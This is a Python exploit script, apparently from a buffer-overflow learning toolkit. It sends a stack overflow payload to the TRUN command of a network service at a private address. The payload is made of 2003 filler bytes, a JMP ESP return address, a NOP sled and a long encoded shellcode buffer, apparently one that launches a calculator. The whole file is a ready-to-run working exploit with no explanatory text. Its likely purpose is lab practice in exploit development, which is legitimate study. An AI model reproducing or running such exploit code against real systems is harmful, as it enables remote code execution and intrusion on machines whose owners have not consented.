#!/usr/bin/python3
#_*_ coding: utf8 _*_

import socket

"""
Project repository: https://github.com/JoshuaProvoste/Stack-Buffer-Overflow-Python-Toolkit 
"""


buf =  ""
buf += "\xbd\x6a\xab\x6b\x04\xd9\xee\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x52\x31\x68\x12\x83\xe8\xfc\x03\x02\xa5\x89"
buf += "\xf1\x2e\x51\xcf\xfa\xce\xa2\xb0\x73\x2b\x93\xf0\xe0"
buf += "\x38\x84\xc0\x63\x6c\x29\xaa\x26\x84\xba\xde\xee\xab"
buf += "\x0b\x54\xc9\x82\x8c\xc5\x29\x85\x0e\x14\x7e\x65\x2e"
buf += "\xd7\x73\x64\x77\x0a\x79\x34\x20\x40\x2c\xa8\x45\x1c"
buf += "\xed\x43\x15\xb0\x75\xb0\xee\xb3\x54\x67\x64\xea\x76"
buf += "\x86\xa9\x86\x3e\x90\xae\xa3\x89\x2b\x04\x5f\x08\xfd"
buf += "\x54\xa0\xa7\xc0\x58\x53\xb9\x05\x5e\x8c\xcc\x7f\x9c"
buf += "\x31\xd7\x44\xde\xed\x52\x5e\x78\x65\xc4\xba\x78\xaa"
buf += "\x93\x49\x76\x07\xd7\x15\x9b\x96\x34\x2e\xa7\x13\xbb"
buf += "\xe0\x21\x67\x98\x24\x69\x33\x81\x7d\xd7\x92\xbe\x9d"
buf += "\xb8\x4b\x1b\xd6\x55\x9f\x16\xb5\x31\x6c\x1b\x45\xc2"
buf += "\xfa\x2c\x36\xf0\xa5\x86\xd0\xb8\x2e\x01\x27\xbe\x04"
buf += "\xf5\xb7\x41\xa7\x06\x9e\x85\xf3\x56\x88\x2c\x7c\x3d"
buf += "\x48\xd0\xa9\x92\x18\x7e\x02\x53\xc8\x3e\xf2\x3b\x02"
buf += "\xb1\x2d\x5b\x2d\x1b\x46\xf6\xd4\xcc\xa9\xaf\xd6\x07"
buf += "\x42\xb2\xd6\x06\xce\x3b\x30\x42\xfe\x6d\xeb\xfb\x67"
buf += "\x34\x67\x9d\x68\xe2\x02\x9d\xe3\x01\xf3\x50\x04\x6f"
buf += "\xe7\x05\xe4\x3a\x55\x83\xfb\x90\xf1\x4f\x69\x7f\x01"
buf += "\x19\x92\x28\x56\x4e\x64\x21\x32\x62\xdf\x9b\x20\x7f"
buf += "\xb9\xe4\xe0\xa4\x7a\xea\xe9\x29\xc6\xc8\xf9\xf7\xc7"
buf += "\x54\xad\xa7\x91\x02\x1b\x0e\x48\xe5\xf5\xd8\x27\xaf"
buf += "\x91\x9d\x0b\x70\xe7\xa1\x41\x06\x07\x13\x3c\x5f\x38"
buf += "\x9c\xa8\x57\x41\xc0\x48\x97\x98\x40\x68\x7a\x08\xbd"
buf += "\x01\x23\xd9\x7c\x4c\xd4\x34\x42\x69\x57\xbc\x3b\x8e"
buf += "\x47\xb5\x3e\xca\xcf\x26\x33\x43\xba\x48\xe0\x64\xef"

xp = "192.168.0.5"
port = 9999

command = "TRUN"
junk = "/.:/"
A = "\x41" * 2003
jmp_esp = "\xAF\x11\x50\x62"
nops = "\x90" * 20

calc_payload = command + " " + junk + A + jmp_esp + nops + buf

try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((xp,port))
	sock.recv(1024)			
	sock.send(calc_payload)
except ConnectionRefusedError:
    print("Connection error. Review the IP address or port.")
    exit()
except socket.timeout:
    sock.close()
    print("\nConnection error. Timeout!")
except socket.error:
    sock.close()
    pass
except KeyboardInterrupt:
    sock.close()
    print("\n\nConnection closed. Bye!")
    exit()